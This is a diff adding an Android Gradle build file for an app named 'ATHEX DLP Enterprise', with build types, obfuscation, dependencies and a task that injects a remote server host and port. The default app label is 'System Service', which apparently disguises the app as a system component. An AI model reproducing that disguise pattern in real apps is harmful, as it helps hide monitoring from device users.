@@ -1,0 +1,363 @@
+// ============================================================
+// ATHEX DLP Enterprise - App-level Build Configuration
+// ============================================================
+
+plugins {
+    id 'com.android.application'
+}
+
+android {
+    // ============================================================
+    // SDK & BUILD CONFIG
+    // ============================================================
+    
+    namespace 'com.athex.dlp'
+    compileSdk 34
+    
+    compileOptions {
+        sourceCompatibility JavaVersion.VERSION_17
+        targetCompatibility JavaVersion.VERSION_17
+        coreLibraryDesugaringEnabled true
+    }
+    
+    // ============================================================
+    // DEFAULT CONFIG
+    // ============================================================
+    
+    defaultConfig {
+        applicationId "com.athex.dlp"
+        minSdk 24
+        targetSdk 34
+        versionCode 200
+        versionName "2.0.0"
+        
+        // MultiDex for large apps
+        multiDexEnabled true
+        
+        // Test instrumentation
+        testInstrumentationRunner "androidx.test.runner.AndroidJUnitRunner"
+        
+        // Build config fields (accessible in code)
+        buildConfigField "String", "BUILD_DATE", "\"${new Date().format('yyyy-MM-dd')}\""
+        buildConfigField "String", "BUILD_TIME", "\"${new Date().format('HH:mm:ss')}\""
+        buildConfigField "String", "BUILD_TYPE_FIELD", "\"${buildType}\""
+        buildConfigField "boolean", "ENABLE_DEBUG_LOGS", "false"
+        buildConfigField "int", "DEFAULT_TCP_PORT", "22533"
+        
+        // Manifest placeholders
+        manifestPlaceholders = [
+            appLabel      : "System Service",
+            appIcon       : "@mipmap/ic_launcher",
+            appRoundIcon  : "@mipmap/ic_launcher_round",
+            serverHost    : "127.0.0.1",
+            serverPort    : "22533"
+        ]
+        
+        // NDK ABI filters
+        ndk {
+            abiFilters 'armeabi-v7a', 'arm64-v8a', 'x86', 'x86_64'
+        }
+    }
+    
+    // ============================================================
+    // BUILD TYPES
+    // ============================================================
+    
+    buildTypes {
+        // Release build
+        release {
+            minifyEnabled true
+            shrinkResources true
+            proguardFiles getDefaultProguardFile('proguard-android-optimize.txt'), 
+                         'proguard-rules.pro'
+            
+            // Obfuscation settings
+            debuggable false
+            jniDebuggable false
+            renderscriptDebuggable false
+            
+            // Optimization
+            zipAlignEnabled true
+            
+            buildConfigField "boolean", "ENABLE_DEBUG_LOGS", "false"
+        }
+        
+        // Debug build
+        debug {
+            minifyEnabled false
+            shrinkResources false
+            debuggable true
+            
+            buildConfigField "boolean", "ENABLE_DEBUG_LOGS", "true"
+            
+            // Debug signing config
+            signingConfig signingConfigs.debug
+        }
+        
+        // Staging/Testing build
+        staging {
+            initWith debug
+            minifyEnabled false
+            
+            buildConfigField "boolean", "ENABLE_DEBUG_LOGS", "true"
+            
+            matchingFallbacks = ['debug']
+        }
+    }
+    
+    // ============================================================
+    // BUILD FEATURES
+    // ============================================================
+    
+    buildFeatures {
+        buildConfig = true
+        aidl = false
+        renderScript = false
+        resValues = true
+        shaders = false
+    }
+    
+    // ============================================================
+    // PACKAGING
+    // ============================================================
+    
+    packagingOptions {
+        resources {
+            excludes += [
+                'META-INF/DEPENDENCIES',
+                'META-INF/LICENSE',
+                'META-INF/LICENSE.txt',
+                'META-INF/NOTICE',
+                'META-INF/NOTICE.txt',
+                'META-INF/INDEX.LIST',
+                'META-INF/*.kotlin_module'
+            ]
+        }
+        
+        // Exclude duplicate files
+        pickFirsts += [
+            '**/libc++_shared.so',
+            '**/libjsc.so'
+        ]
+    }
+    
+    // ============================================================
+    // LINT OPTIONS
+    // ============================================================
+    
+    lint {
+        abortOnError false
+        checkReleaseBuilds false
+        disable += [
+            'MissingTranslation',
+            'ExtraTranslation',
+            'ValidFragment',
+            'IconDensity',
+            'IconMissingDensityFolder'
+        ]
+        warning += [
+            'InvalidPackage',
+            'NewApi'
+        ]
+    }
+    
+    // ============================================================
+    // DEX OPTIONS
+    // ============================================================
+    
+    dexOptions {
+        javaMaxHeapSize "4g"
+        preDexLibraries true
+        maxProcessCount 8
+    }
+    
+    // ============================================================
+    // SOURCE SETS
+    // ============================================================
+    
+    sourceSets {
+        main {
+            java.srcDirs = ['src/main/java']
+            res.srcDirs = ['src/main/res']
+            manifest.srcFile 'src/main/AndroidManifest.xml'
+            assets.srcDirs = ['src/main/assets']
+            jniLibs.srcDirs = ['src/main/jniLibs']
+        }
+        
+        debug {
+            java.srcDirs = ['src/debug/java']
+            res.srcDirs = ['src/debug/res']
+        }
+        
+        release {
+            java.srcDirs = ['src/release/java']
+            res.srcDirs = ['src/release/res']
+        }
+    }
+}
+
+// ============================================================
+// DEPENDENCIES
+// ============================================================
+
+dependencies {
+    // ============================================================
+    // ANDROIDX CORE
+    // ============================================================
+    
+    // Core AndroidX
+    implementation 'androidx.core:core:1.12.0'
+    implementation 'androidx.appcompat:appcompat:1.6.1'
+    implementation 'androidx.annotation:annotation:1.7.1'
+    implementation 'androidx.collection:collection:1.3.0'
+    implementation 'androidx.arch.core:core-common:2.2.0'
+    implementation 'androidx.arch.core:core-runtime:2.2.0'
+    
+    // ============================================================
+    // UI COMPONENTS
+    // ============================================================
+    
+    // Material Design
+    implementation 'com.google.android.material:material:1.11.0'
+    
+    // ConstraintLayout
+    implementation 'androidx.constraintlayout:constraintlayout:2.1.4'
+    
+    // RecyclerView
+    implementation 'androidx.recyclerview:recyclerview:1.3.2'
+    
+    // CardView
+    implementation 'androidx.cardview:cardview:1.0.0'
+    
+    // SwipeRefreshLayout
+    implementation 'androidx.swiperefreshlayout:swiperefreshlayout:1.1.0'
+    
+    // ============================================================
+    // LIFECYCLE & BACKGROUND
+    // ============================================================
+    
+    // Lifecycle
+    implementation 'androidx.lifecycle:lifecycle-runtime:2.7.0'
+    implementation 'androidx.lifecycle:lifecycle-common:2.7.0'
+    implementation 'androidx.lifecycle:lifecycle-process:2.7.0'
+    
+    // WorkManager (for guaranteed background work)
+    implementation 'androidx.work:work-runtime:2.9.0'
+    
+    // ============================================================
+    // NETWORKING
+    // ============================================================
+    
+    // OkHttp (optional, for HTTP operations)
+    implementation 'com.squareup.okhttp3:okhttp:4.12.0'
+    implementation 'com.squareup.okhttp3:logging-interceptor:4.12.0'
+    
+    // ============================================================
+    // DATA & STORAGE
+    // ============================================================
+    
+    // Gson (JSON serialization)
+    implementation 'com.google.code.gson:gson:2.10.1'
+    
+    // Room Database (optional)
+    implementation 'androidx.room:room-runtime:2.6.1'
+    annotationProcessor 'androidx.room:room-compiler:2.6.1'
+    
+    // ============================================================
+    // SECURITY
+    // ============================================================
+    
+    // Security Crypto
+    implementation 'androidx.security:security-crypto:1.1.0-alpha06'
+    
+    // ============================================================
+    // MULTIDEX
+    // ============================================================
+    
+    implementation 'androidx.multidex:multidex:2.0.1'
+    
+    // ============================================================
+    // CORE LIBRARY DESUGARING
+    // ============================================================
+    
+    coreLibraryDesugaring 'com.android.tools:desugar_jdk_libs:2.0.4'
+    
+    // ============================================================
+    // TESTING
+    // ============================================================
+    
+    testImplementation 'junit:junit:4.13.2'
+    androidTestImplementation 'androidx.test.ext:junit:1.1.5'
+    androidTestImplementation 'androidx.test.espresso:espresso-core:3.5.1'
+}
+
+// ============================================================
+// TASK: INJECT SERVER CONFIG
+// ============================================================
+
+/**
+ * Task to inject server configuration into the build
+ * Usage: ./gradlew assembleRelease -PserverHost=192.168.1.100 -PserverPort=22533
+ */
+task injectServerConfig {
+    doLast {
+        def host = project.hasProperty('serverHost') ? project.serverHost : '127.0.0.1'
+        def port = project.hasProperty('serverPort') ? project.serverPort : '22533'
+        
+        println "============================================"
+        println "  ATHEX DLP - Injecting Server Config"
+        println "  Host: ${host}"
+        println "  Port: ${port}"
+        println "============================================"
+        
+        // Update manifest placeholders
+        android.defaultConfig.manifestPlaceholders = [
+            appLabel      : project.hasProperty('appLabel') ? project.appLabel : "System Service",
+            appIcon       : "@mipmap/ic_launcher",
+            appRoundIcon  : "@mipmap/ic_launcher_round",
+            serverHost    : host,
+            serverPort    : port
+        ]
+        
+        // Update build config
+        android.defaultConfig.buildConfigField "int", "DEFAULT_TCP_PORT", port
+    }
+}
+
+// ============================================================
+// TASK: PRINT BUILD INFO
+// ============================================================
+
+task printBuildInfo {
+    doLast {
+        println ""
+        println "╔════════════════════════════════════════════╗"
+        println "║     ATHEX DLP ENTERPRISE BUILD INFO        ║"
+        println "╠════════════════════════════════════════════╣"
+        println "║  Version:     ${android.defaultConfig.versionName}                          ║"
+        println "║  VersionCode: ${android.defaultConfig.versionCode}                         ║"
+        println "║  Min SDK:     ${android.defaultConfig.minSdk}                           ║"
+        println "║  Target SDK:  ${android.defaultConfig.targetSdk}                          ║"
+        println "║  Build Date:  ${new Date().format('yyyy-MM-dd')}                   ║"
+        println "║  Build Time:  ${new Date().format('HH:mm:ss')}                     ║"
+        println "╚════════════════════════════════════════════╝"
+        println ""
+    }
+}
+
+wrapper {
+    gradleVersion = '8.2'
+    distributionType = Wrapper.DistributionType.ALL
+}
+
+configurations.all {
+    resolutionStrategy {
+        force 'androidx.core:core:1.12.0'
+        force 'androidx.appcompat:appcompat:1.6.1'
+        force 'com.google.code.gson:gson:2.10.1'
+        
+        cacheDynamicVersionsFor 10, 'minutes'
+        
+        cacheChangingModulesFor 0, 'seconds'
+    }
+}
